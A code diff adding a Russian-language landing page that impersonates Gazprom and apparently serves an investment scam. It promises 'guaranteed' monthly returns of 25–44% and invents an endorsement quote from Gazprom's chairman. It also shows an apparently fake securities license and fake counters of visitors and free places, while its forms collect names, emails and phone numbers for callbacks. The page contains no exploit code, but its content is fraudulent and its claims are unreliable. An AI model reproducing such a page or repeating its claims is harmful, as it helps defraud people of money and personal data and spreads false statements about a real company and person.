@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Газпром-Инвест Официальный сайт</title>
+    <link rel="shortcut icon" href="/l/gaz/img/favicon.ico">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700,800|Ubuntu:400,500,700&amp;display=swap&amp;subset=cyrillic,cyrillic-ext,latin-ext"
+          rel="stylesheet">
+    <link href="/l/gaz/css/errors.css" rel="stylesheet">
+    <link href="/l/gaz/css/bundle.e15e13582eb553ce5360.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        /*$(document).ready(function() {
+            $('#content').load('uniq.php');
+        });*/
+        $.ajax({
+            url: '/uniq',
+            type: 'GET',
+            success: function(data) {
+                //window.location = data.url;
+                //console.log(data)
+                /*
+                $.ajaxSetup({
+                    headers: data
+                });
+                */
+                //console.log('ok');
+            },
+            error: function() {
+                //console.log('Error...');
+            }
+        });
+    </script>
+    </head>
+
+<body id="body" class="text-primary font-sans leading-snug">
+
+<header class="sm:w-full sm:z-50 sm:mb-8" >
+    <div class="container relative flex justify-between items-center mx-auto py-4 mb-6 sm:mb-0" id="scrollTarget">
+        <div class="flex w-1/2 md:w-auto">
+            <a href="/">
+                <img src="/l/gaz/img/logo.png" alt="logo">
+            </a>
+        </div>
+        <div class="flex w-1/2 justify-end">
+            <img src="/l/gaz/img/rus.png" alt="rus">
+        </div>
+    </div>
+</header>
+
+<div class="fixed z-50 w-53 h-13 rounded-custom-right py-2 px-3 flex flex-col bg-secondary text-white shadow text-center left-0 sm:hidden">
+    <span id="rand_man">125</span>
+    <span class="tracking-wide whitespace-no-wrap">
+            ЧЕЛОВЕК НА СТРАНИЦЕ
+        </span>
+</div>
+<div class="fixed z-50 w-53 h-13 rounded-custom-left py-2 px-3 flex flex-col bg-secondary text-white shadow text-center right-0 sm:hidden">
+    <span id="rand_places">14 </span>
+    <span class="tracking-wide">
+            СВОБОДНЫХ МЕСТ
+        </span>
+</div>
+
+<main class="">
+    <section class="container mx-auto mb-16 sm:mb-12 pt-4 sm:pt-0">
+        <h1 class="sm:text-3xl text-5xl text-center leading-extra-tight sm:leading-snug font-ubuntu font-black mb-3 sm:mb-6">
+            Газпром разрешил торговать газом
+        </h1>
+        <h2 class="text-center text-2xl mb-6 sm:text-xl">
+            Теперь национальные ресурсы в ваших руках!
+        </h2>
+    </section>
+
+    <section id="about" class="container mx-auto mb-24 sm:mb-24">
+        <div class="row justify-center items-center">
+            <div class="relative pr-2 flex js-vid1 col-xl-8 col-lg-7">
+                <video width="100%" height="100%" autoplay="autoplay" controls="controls" muted=""
+                       class="video-js embed-responsive-item">
+                    <source src="/l/gaz/videos/gaz-platform-preview.mp4" type="video/mp4">
+                    <source src="/l/gaz/img/gaz-platform-preview_Moment.jpg" type="video/webm">
+                </video>
+            </div>
+            <div class="pl-6 block col-xl-4 col-lg-5">
+
+                <form action="/lead" method="POST" autocomplete="off" id="form"
+                      class="mb-0 signup_form block bg-white sm:shadow-none sm:bg-transparent rounded-custom shadow-form text-primary overflow-hidden w-full pt-6 pb-4 px-6 sm:pt-2 sm:px-4 sm:leading-tight">
+
+                    <h3 class="text-2xl text-center font-bold font-ubuntu mb-6 sm:mb-10">Начните зарабатывать на
+                        государственном газе!</h3>
+
+                    <div class="flex flex-col mb-8 sm:mb-10">
+                        <input class="pl-0 p-2 border-b border-primary sm:bg-transparent focus:outline-none" type="text"
+                               name="first_name" placeholder="Имя" required>
+                    </div>
+                    <div class="flex flex-col mb-8 sm:mb-10">
+                        <input class="pl-0 p-2 border-b border-primary sm:bg-transparent focus:outline-none" type="text"
+                               name="last_name" placeholder="Фамилия" required>
+                    </div>
+                    <div class="flex flex-col mb-8 sm:mb-10">
+                        <input class="pl-0 p-2 border-b border-primary sm:bg-transparent focus:outline-none"
+                               type="email" name="email" placeholder="Электронная почта" required>
+                    </div>
+                    <div class="flex flex-col mb-8 sm:mb-10">
+                        <input class="pl-0 num border-b border-primary sm:bg-transparent focus:outline-none" type="text"
+                               name="phone_raw" data-not-remember="" required placeholder="Ваш номер телефона" minlength="6">
+                        <input type="hidden" name="phone" data-not-remember="">
+                    </div>
+
+                    <div class="flex mb-4 justify-center" style="margin-top: 13px">
+                        <button class="btn btn_send w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3"
+                                type="submit" onclick="showDivContent(); ">Начать зарабатывать
+                        </button>
+                    </div>
+                    <p class="text-xs w-full sm:w-3/5 sm:mx-auto text-center opacity-50">Нажимая кнопку, я принимаю
+                        клиентское соглашение</p>
+                    <input type="hidden" name="phonecc" value="+7">
+                    <input type="hidden" name="flow_hash" value="63e39c542103505900">
+                    <input type="hidden" name="landing" value="gazprom">
+                    <input type="hidden" name="facebook_pixel_id" value="{facebook_pixel_id}">
+                    <input type="hidden" name="landing_url" value="">
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <section id="content" class="container pt-4 mb-32 mx-auto">
+        <div class="w-full sm:flex sm:flex-col">
+            <div class="inline-block sm:float-none float-left sm:-ml-4 sm:w-screen w-2/5">
+                <article class="p-8 sm:py-20 sm:px-4 flex flex-col bg-primary text-white"
+                         style="flex-wrap: wrap;flex-direction: row;align-items: flex-start;">
+                    <h3 class="text-4xl sm:text-3xl font-ubuntu font-bold mb-8 sm:mb-16">Почему это выгодно <br> для
+                        обычных граждан</h3>
+                    <div class="flex items-center mb-12"
+                         style="margin: 0 auto; margin-bottom: 40px;flex-direction: row;width: 95%;height: auto;">
+                        <div class="w-1/5">
+                            <img src="/l/gaz/img/img.svg" alt="svg">
+                        </div>
+                        <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">
+                            Значительная прибыль при минимальных рисках
+                        </p>
+                    </div>
+                    <div class="flex items-center mb-12"
+                         style="margin: 0 auto; margin-bottom: 40px;flex-direction: row;width: 95%;height: auto;">
+                        <div class="w-1/5">
+                            <img src="/l/gaz/img/img2.svg" alt="svg">
+                        </div>
+                        <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">
+                            Один из самых доходных активов
+                        </p>
+                    </div>
+                    <div class="flex items-center mb-10"
+                         style="margin: 0 auto; margin-bottom: 40px;flex-direction: row;width: 95%;height: auto;">
+                        <div class="w-1/5">
+                            <img src="/l/gaz/img/img3.svg" alt="svg">
+                        </div>
+                        <p class="w-4/5 pl-3 text-lg sm:text-base sm:pl-4">
+                            Быстрый вывод средств на любую карту банка России
+                        </p>
+                    </div>
+                </article>
+            </div>
+            <div class="pl-8 inline-block sm:float-none float-left sm:w-screen sm:-ml-4 sm:p-0 w-3/5">
+                <article class="p-8 sm:pt-20 sm:pb-12 sm:px-4 flex flex-col bg-secondary text-white">
+                    <h3 class="text-4xl sm:text-3xl sm:mb-16 font-bold font-ubuntu mb-8">Что нужно сделать, чтобы
+                        начать
+                        зарабатывать c Газпром уже сейчас?</h3>
+                    <ul class="text-lg">
+                        <li class="mb-10 flex items-start"><span
+                                class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"></span>Зарегистрироваться
+                            на данном сайте в форме выше
+                        </li>
+                        <li class="mb-10 flex items-start"><span
+                                class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"></span>Дождаться
+                            звонка от консультанта компании Газпром и подтвердить регистрацию
+                        </li>
+                        <li class="mb-10 flex items-start"><span
+                                class="mt-3 w-4 h-1 bg-white inline-block mr-4 sm:flex-shrink-0 sm:w-3"></span>Выбрать
+                            желаемую сумму на счет и уже через 30 дней получить первый доход
+                        </li>
+                    </ul>
+                </article>
+            </div>
+        </div>
+        <div class="w-full flex sm:flex-col-reverse flex_cent">
+            <div class="pt-18 inline-block w-2/5 text-primary sm:p-0 sm:w-full">
+                <article class="flex flex-col text-lg sm:text-base">
+                    <h4 class="text-2xl font-ubuntu font-bold mb-2">Алексей Миллер</h4>
+                    <h5 class="text-black opacity-50 mb-10 sm:mb-6">председатель правления совета <br> директоров
+                        ПАО
+                        «Газпром»</h5>
+                    <p class="mb-8 sm:leading-relaxed">
+                        Мы приняли решение открыть доступ к торгам для всех граждан страны, поскольку это будет
+                        выгодно
+                        как для Газпрома, так и для россиян.
+                        <br><br>
+                        Дело в том, что на данный момент российский газ становится самым востребованным на мировом
+                        рынке. Во всех странах мира стремительно растет спрос на его покупку. По этой причине мы
+                        решили
+                        увеличить объемы производства газа в 4 раза и привлечь людей со всей России в качестве
+                        инвесторов.
+                        <br><br>
+                        Поскольку цены на газ сейчас быстро меняются, все, кто участвуют в проектах Газпрома,
+                        получают в
+                        среднем по $800-$8,500 дохода ежемесячно.
+                    </p>
+                    <div class="text-base">
+                        <a href="#about"
+                           class="inline-block scroll-to-form text-center w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3">Проконсультироваться</a>
+                    </div>
+                </article>
+            </div>
+            <div class="-ml-1 -mt-24 sm:mt-0 sm:-ml-4 sm:p-0 sm:w-screen sm:mb-8 sm:overflow-hidden pl-8 relative inline w-3/5 text-primary">
+                <img class="sm:-mt-12" src="/l/gaz/img/photo.jpg" alt="photo">
+            </div>
+        </div>
+    </section>
+
+    <div class="pt-8 pb-8 bg-primary mb-32">
+        <section class="container mx-auto flex justify-center pb-12 pt-12">
+            <div class="flex flex-col w-2/5 items-center bg-white md:w-4/5 sm:w-full ">
+                <form method="post"
+                      class="block bg-white text-primary overflow-hidden w-full pt-6 pb-4 px-6 sm:pt-2 sm:px-4 sm:leading-tight">
+                    <h3 class="text-2xl text-center font-bold font-ubuntu mt-5 mb-6 sm:mb-10">
+                        Сколько я заработаю?
+                    </h3>
+                    <div class="flex flex-col text-center font-bold mb-4 sm:mb-10 px-5">
+                        <label class="block text-center font-bold mb-2">Ваша инвестиция</label>
+                        <input type="text" class="js-range-slider irs-hidden-input" name="my_range" value="150"
+                               tabindex="-1" readonly="">
+                    </div>
+                    <div class="flex flex-col mb-5">
+                        <label class="block text-center font-bold ">Ваша прибыль</label>
+                        <h3 class="text-2xl text-center font-bold font-ubuntu mt-5" id="calcResult">15840 руб.</h3>
+                    </div>
+                    <div class="flex mb-4 justify-center">
+                        <a href="#about" class="inline-block toform text-center w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover
+                       text-white rounded py-3">
+                            Узнать подробнее
+                        </a>
+                    </div>
+                </form>
+            </div>
+        </section>
+    </div>
+
+    <div class="container mx-auto mb-24 sm:mb-24 text-center">
+        <h2 class="mb-8 text-4xl sm:text-3xl font-bold font-ubuntu text-center">
+            Лицензия профессионального участника рынка ценных бумаг <br>«Газпром-Инвест»
+        </h2>
+        <div class="w-full sm:flex sm:flex-col">
+            <div class="inline-block sm:float-none sm:-ml-4 sm:w-screen w-1/2">
+                <div class="license-block">
+                    <p class="mb-2">
+                        <span class="text-extra-bold">Лицензия</span>
+                        №045-13980-02000 От 13.12.2019 Профессиональной и биржевой деятельности по ценным бумагам
+                        <span class="block text-extra-bold">ПАО "Государственная платформа Газпром"</span>
+                    </p>
+                    <a data-fancybox="gallery" class="license-img fancy-img" href="/l/gaz/img/license.jpg">
+                        <img src="/l/gaz/img/license.jpg" alt="Лицензия" class="w-1/2 mx-auto">
+                    </a>
+                </div>
+                <a data-fancybox="gallery1"
+                   class="inline-block mt-2 text-center w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3 fancy-img"
+                   href="/l/gaz/img/license.jpg">Увеличить фото</a>
+            </div>
+
+        </div>
+    </div>
+
+    <section id="posts" class="w-full mb-20">
+        <h2 class="mb-8 text-4xl sm:text-3xl font-bold font-ubuntu text-center">Проекты Газпрома, открытые для
+            участия</h2>
+        <div class="text-white flex sm:flex-wrap">
+            <div class="w-1/3 sm:w-full">
+                <article class="flex post items-end">
+                    <div class="absolute w-full h-full top-0 left-0 post-wrapper">
+                        <img class="h-full sm:h-auto sm:w-full tr-center" src="/l/gaz/img/image 51.jpg" alt="">
+                    </div>
+                    <div class="relative z-10 p-8 sm:px-4">
+                        <h3 class="mb-4 font-bold font-ubuntu text-4xl sm:text-3xl">Сила Сибири</h3>
+                        <p class="mb-10sm:text-xl  text-2xl font-ubuntu">от 50 000 рублей ежемесячно</p>
+                        <p class="mb-8 text-lg sm:text-base">Крупнейшая система транспортировки газа
+                            на востоке России</p>
+                        <div>
+                            <a href="#about"
+                               class="inline-block toform px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3">Подать
+                                заявку</a>
+                        </div>
+                    </div>
+                </article>
+            </div>
+            <div class="w-1/3 sm:w-full">
+                <article class="flex post items-end">
+                    <div class="absolute w-full h-full top-0 left-0 post-wrapper">
+                        <img class="h-full tr-center sm:h-auto sm:w-full" src="/l/gaz/img/image 53.jpg" alt="">
+                    </div>
+                    <div class="relative z-10 p-8 sm:px-4">
+                        <h3 class="mb-2 font-bold font-ubuntu text-4xl sm:text-3xl">Северный поток</h3>
+                        <p class="mb-4 sm:text-xl text-2xl font-ubuntu">25% гарантированных выплат ежемесячно</p>
+                        <p class="mb-8 text-lg sm:text-base">Газопровод, напрямую соединивший Россию и Европу</p>
+                        <div>
+                            <a href="#about"
+                               class="inline-block px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3">Подать
+                                заявку</a>
+                        </div>
+                    </div>
+                </article>
+            </div>
+            <div class="w-1/3 sm:w-full">
+                <article class="flex post items-end">
+                    <div class="absolute w-full h-full top-0 left-0 post-wrapper">
+                        <img class="h-full sm:h-auto sm:w-full tr-center" src="/l/gaz/img/image 52.jpg" alt="">
+                    </div>
+                    <div class="relative z-10 p-8 sm:px-4">
+                        <h3 class="mb-2 font-bold font-ubuntu text-4xl sm:text-3xl">Турецкий поток</h3>
+                        <p class="mb-4 sm:text-xl text-2xl font-ubuntu">44% гарантированных выплат ежемесячно</p>
+                        <p class="mb-8 text-lg sm:text-base">Экспорт газа в Турцию, Южную и Юго-Восточную Европу</p>
+                        <div>
+                            <a href="#about"
+                               class="inline-block text-center px-4 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3">Подать
+                                заявку</a>
+                        </div>
+                    </div>
+                </article>
+            </div>
+        </div>
+    </section>
+
+    <section id="partners" class="container sm:px-0 flex flex-col items-center mx-auto">
+        <div class="w-8/12 sm:w-full flex sm:flex-wrap items-center justify-between">
+            <div class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="64" height="64" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite1.svg#p1"></use>
+                </svg>
+            </div>
+            <div class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="64" height="64" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite2.svg#p2"></use>
+                </svg>
+            </div>
+            <div class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="64" height="64" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite3.svg#p3"></use>
+                </svg>
+            </div>
+            <div class="w-1/12 sm:flex sm:justify-center sm:w-1/4 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="64" height="64" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite4.svg#p4"></use>
+                </svg>
+            </div>
+            <div class="w-1/12 sm:flex sm:justify-end sm:w-1/3 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="64" height="64" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite5.svg#p5"></use>
+                </svg>
+            </div>
+            <div class="w-1/12 sm:flex sm:justify-center sm:w-1/3 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="64" height="64" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite6.svg#p6"></use>
+                </svg>
+            </div>
+            <div class="w-1/12 sm:flex sm:justify-start sm:w-1/3 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="64" height="64" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite7.svg#p7"></use>
+                </svg>
+            </div>
+        </div>
+        <div class="w-8/12 sm:w-full flex sm:flex-wrap items-center justify-center">
+            <div class="w-2/12 sm:-mr-1 sm:flex sm:justify-center sm:w-1/3 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="128" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite8.svg#p8"></use>
+                </svg>
+            </div>
+            <div class="w-2/12 sm:-mr-2 sm:flex sm:justify-center sm:w-1/3 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="128" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite9.svg#p9"></use>
+                </svg>
+            </div>
+            <div class="w-2/12 sm:-ml-1 sm:flex sm:w-1/3 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="128" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite10.svg#p10"></use>
+                </svg>
+            </div>
+            <div class="w-2/12 sm:-mt-10 sm:flex sm:justify-center sm:w-1/2 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="128" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite11.svg#p11"></use>
+                </svg>
+            </div>
+            <div class="w-2/12 sm:-mt-10 sm:flex sm:justify-center sm:w-1/2 text-svg hover:text-btn-hover transition">
+                <svg class="icon" width="128" viewBox="0 0 64 64">
+                    <use xlink:href="/l/gaz/img/sprite12.svg#p12"></use>
+                </svg>
+            </div>
+        </div>
+    </section>
+</main>
+
+<div class="pt-8 pb-8 bg-primary">
+    <section class="container mx-auto flex justify-center pb-12 pt-12">
+        <div class="flex flex-col w-2/5 items-center bg-white md:w-4/5 sm:w-full ">
+            <form action="/lead" method="POST" autocomplete="off"
+                  class="mb-0 signup_form block bg-white sm:shadow-none sm:bg-transparent rounded-custom shadow-form text-primary overflow-hidden w-full pt-6 pb-4 px-6 sm:pt-2 sm:px-4 sm:leading-tight">
+
+                <div class="w-auto text-center flex justify-center">
+                    <img src="/l/gaz/img/logo.png" alt="logo">
+                </div>
+                <input type="hidden" name="invest" class="currval">
+                <h3 class="text-2xl text-center font-bold font-ubuntu mb-6 sm:mb-10">Начните зарабатывать на
+                    государственном газе!</h3>
+
+                <div class="flex flex-col mb-8 sm:mb-10">
+                    <input class="pl-0 p-2 border-b border-primary sm:bg-transparent focus:outline-none" type="text"
+                           name="first_name" placeholder="Имя" required>
+                </div>
+                <div class="flex flex-col mb-8 sm:mb-10">
+                    <input class="pl-0 p-2 border-b border-primary sm:bg-transparent focus:outline-none" type="text"
+                           name="last_name" placeholder="Фамилия" required>
+                </div>
+                <div class="flex flex-col mb-8 sm:mb-10">
+                    <input class="pl-0 p-2 border-b border-primary sm:bg-transparent focus:outline-none"
+                           type="email" name="email" placeholder="Электронная почта" required>
+                </div>
+                <div class="flex flex-col mb-8 sm:mb-10">
+                    <input class="pl-0 num border-b border-primary sm:bg-transparent focus:outline-none" type="text"
+                           name="phone_raw" data-not-remember="" required placeholder="Ваш номер телефона" minlength="6">
+                    <input type="hidden" name="phone" data-not-remember="">
+                </div>
+
+                <div class="flex mb-4 justify-center" style="margin-top: 13px">
+                    <button class="btn btn_send w-56 font-sans font-bold transition bg-btn-primary hover:bg-btn-hover text-white rounded py-3"
+                            type="submit" onclick="showDivContent(); ">Начать зарабатывать
+                    </button>
+                </div>
+                <p class="text-xs w-full sm:w-3/5 sm:mx-auto text-center opacity-50">Нажимая кнопку, я принимаю
+                    клиентское соглашение</p>
+                <input type="hidden" name="flow_hash" value="63e39c542103505900">
+                <input type="hidden" name="landing" value="gazprom">
+                <input type="hidden" name="facebook_pixel_id" value="{facebook_pixel_id}">
+                <input type="hidden" name="landing_url" value="">
+            </form>
+        </div>
+    </section>
+</div>
+
+<footer>
+    <div class="container mx-auto py-4 text-center sm:leading-relaxed opacity-50 sm:text-xs">
+        <p>
+                <span data-bs-toggle="modal" class="modal-link-footer" data-bs-target="#privacy">
+                     Политика конфиденциальности
+                </span></p>
+        *Все результаты работы в данной сфере индивидуальны и зависят от каждого клиента
+        ПАО "ГазПромИнвестинг"
+        <p style="text-align: center">
+            ©2018-<span id="gtd-date-current-year"></span> ГазПромИнвестинг
+        </p>
+    </div>
+</footer>
+<div class="modal" id="privacy" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="exampleModalLabel">Политика в отношении обработки персональных данных
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Закрыть"></button>
+            </div>
+            <div class="modal-body">
+                <h3>1. Общие положения
+                </h3>
+                <p>
+                    1.1. Политика в отношении обработки персональных данных (далее — Политика) направлена на защиту прав
+                    и свобод физических лиц, персональные данные которых обрабатывает
+                </p>
+                <p>
+                    1.2. Политика разработана в соответствии с п. 2 ч. 1 ст. 18.1 Федерального закона от 27 июля 2006 г.
+                    № 152-ФЗ «О персональных данных» (далее — ФЗ «О персональных данных»).
+                </p>
+                <p>
+                    1.3. Политика содержит сведения, подлежащие раскрытию в соответствии с ч. 1 ст. 14 ФЗ «О
+                    персональных данных», и является общедоступным документом.
+                </p>
+                <p>1.4. Настоящая Политика подлежит изменению и/или дополнению при изменении законодательства Российской
+                    Федерации, внутренних нормативных актов Оператора, а также в соответствии с принятым решением
+                    руководящими органами Оператора.
+
+                </p>
+                <h3>3. Сведения об обработке персональных данных
+
+                </h3>
+                <p>
+                    3.1. Оператор обрабатывает персональные данные на законной и справедливой основе для выполнения
+                    возложенных законодательством функций, полномочий и обязанностей, осуществления прав и законных
+                    интересов Оператора, работников Оператора и третьих лиц.
+                </p>
+                <p>
+                    3.2. Оператор получает персональные данные непосредственно у субъектов персональных данных.
+                </p>
+                <p>
+                    3.3. Оператор обрабатывает персональные данные автоматизированным и неавтоматизированным способами,
+                    с использованием средств вычислительной техники и без использования таких средств
+                </p>
+                <p>3.4. Действия по обработке персональных данных включают сбор, запись, систематизацию, накопление,
+                    хранение, уточнение (обновление, изменение), извлечение, использование, передачу (предоставление,
+                    доступ), обезличивание, блокирование, удаление и уничтожение.
+
+                </p>
+                <p>
+                    3.5. Оператор осуществляет анализ предпочтений пользователя и мониторинг потребительского поведения
+                    с использованием сторонних сервисов аналитики, размещенных на сайтах:
+
+
+                </p>
+                <p>4.1. Оператор обрабатывает персональные данные клиентов в рамках правоотношений с Оператором,
+                    урегулированных частью второй Гражданского Кодекса Российской Федерации от 26 января 1996 г. №
+                    14-ФЗ, (далее — клиентов).
+                </p>
+                <p>
+                    4.2. Оператор обрабатывает персональные данные клиентов в целях соблюдения норм законодательства РФ,
+                    а также с целью:
+                </p>
+                <p>идентификации пользователя настоящего интернет-сайта;
+                    предоставления пользователям сайта и клиентам эффективной клиентской поддержки
+                    информирования о новых товарах, специальных акциях, предложениях и услугах Оператора и третьих лиц
+                    по усмотрению Оператора, в том числе путем осуществления прямых контактов с субъектом персональных
+                    данных с помощью средств связи;
+                    заключение и исполнение условий договора;
+                    организации и проведения Оператором мероприятий и опросов, маркетинговых, статистических и прочих
+                    исследований;
+                    анализа качества предоставляемых товаров и услуг и улучшения качества обслуживания клиентов;
+                    анализ предпочтений и мониторинг потребительского поведения Пользователя настоящего
+                    интернет-сайта;</p>
+                <p>4.3. Оператор обрабатывает персональные данные клиентов с их согласия, предоставляемого клиентами
+                    и/или их законными представителями путем совершения конклюдентных действий на настоящем
+                    интернет-сайте, в том числе, но не ограничиваясь, оформлением заказа, регистрацией в личном
+                    кабинете, подпиской на рассылку, в соответствии с настоящей Политикой.
+
+                </p>
+                <p>4.4. Оператор обрабатывает персональные данные клиентов не дольше, чем того требуют цели обработки
+                    персональных данных, если иное не предусмотрено требованиями законодательства РФ.
+                </p>
+                <p>4.5. Оператор обрабатывает следующие персональные данные клиентов:
+
+                </p>
+                <h3>5. Сведения об обеспечении безопасности персональных данных
+
+                </h3>
+                <p>5.1. Оператор назначает ответственного за организацию обработки персональных данных для выполнения
+                    обязанностей, предусмотренных ФЗ «О персональных данных» и принятыми в соответствии с ним
+                    нормативными правовыми актами.
+                </p>
+                <p>
+                    5.2. Оператор применяет комплекс правовых, организационных и технических мер по обеспечению
+                    безопасности персональных данных для обеспечения конфиденциальности персональных данных и их защиты
+                    от неправомерных действий:
+                </p>
+                <p>
+                    обеспечивает неограниченный доступ к Политике, копия которой размещена по адресу нахождения
+                    Оператора, а также может быть размещена на сайте Оператора (при его наличии);
+                    во исполнение Политики утверждает и приводит в действие документ «Положение об обработке
+                    персональных данных» (далее — Положение) и иные локальные акты;
+                    производит ознакомление работников с положениями законодательства о персональных данных, а также с
+                    Политикой и Положением;
+                    осуществляет допуск работников к персональным данным, обрабатываемым в информационной системе
+                    Оператора, а также к их материальным носителям только для выполнения трудовых обязанностей;
+                    устанавливает правила доступа к персональным данным, обрабатываемым в информационной системе
+                    Оператора, а также обеспечивает регистрацию и учёт всех действий с ними;
+
+                </p>
+                <p>
+                    производит оценку вреда, который может быть причинен субъектам персональных данных в случае
+                    нарушения ФЗ «О персональных данных»;
+                    производит определение угроз безопасности персональных данных при их обработке в информационной
+                    системе Оператора;
+                    применяет организационные и технические меры и использует средства защиты информации, необходимые
+                    для достижения установленного уровня защищенности персональных данных;
+                </p>
+                <p>осуществляет обнаружение фактов несанкционированного доступа к персональным данным и принимает меры
+                    по реагированию, включая восстановление персональных данных, модифицированных или уничтоженных
+                    вследствие несанкционированного доступа к ним;
+                    производит оценку эффективности принимаемых мер по обеспечению безопасности персональных данных до
+                    ввода в эксплуатацию информационной системы Оператора;
+                    осуществляет внутренний контроль соответствия обработки персональных данных ФЗ «О персональных
+                    данных», принятым в соответствии с ним нормативным правовым актам, требованиям к защите персональных
+                    данных, Политике, Положению и иным локальным актам, включающий контроль за принимаемыми мерами по
+                    обеспечению безопасности персональных данных и их уровня защищенности при обработке в информационной
+                    системе Оператора.
+                    6. Права субъектов персональных данных</p>
+                <h3>6.1. Субъект персональных данных имеет право:
+
+                </h3>
+                <p>
+                    на получение персональных данных, относящихся к данному субъекту, и информации, касающейся их
+                    обработки;
+                    на уточнение, блокирование или уничтожение его персональных данных в случае, если они являются
+                    неполными, устаревшими, неточными, незаконно полученными или не являются необходимыми для заявленной
+                    цели обработки;
+                    на отзыв данного им согласия на обработку персональных данных;
+                    на защиту своих прав и законных интересов, в том числе на возмещение убытков и компенсацию
+                    морального вреда в судебном порядке;
+                    на обжалование действий или бездействия Оператора в уполномоченный орган по защите прав субъектов
+                    персональных данных или в судебном порядке.
+                </p>
+                <p>6.2. Для реализации своих прав и законных интересов субъекты персональных данных имеют право
+                    обратиться к Оператору либо направить запрос лично или с помощью представителя. Запрос должен
+                    содержать сведения, указанные в ч. 3 ст. 14 ФЗ «О персональных данных».
+                </p>
+
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Закрыть</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.1/js/bootstrap.min.js" integrity="sha512-EKWWs1ZcA2ZY9lbLISPz8aGR2+L7JVYqBAYTq5AXgBkSjRSuQEGqWx8R1zAX16KdXPaCjOCaKE8MCpU0wcHlHA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ion-rangeslider/2.3.1/js/ion.rangeSlider.min.js" integrity="sha512-kZsqvmw94Y8hyhwtWZJvDtobwQ9pLhF1DuIvcqSuracbRn6WJs1Ih+04fpH/8d1CFKysp7XA1tR0Aa2jKLTQUg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="/l/gaz/js/index.js"></script>
+<script src="/l/gaz/js/intlTelInput.min.js"></script>
+<script src="/l/gaz/js/errors.js?t=2"></script>
+<script src="/l/gaz/js/landing_url2.js"></script>
+<script>
+    function showDivContent() {
+        const divContent = document.querySelector('.iti__selected-dial-code').innerHTML;
+        const inputField = document.querySelector('input[name="phonecc"]');
+        inputField.value = `${divContent}`;
+        document.getElementById('form').submit();
+    }
+</script>
+</body>
+</html>
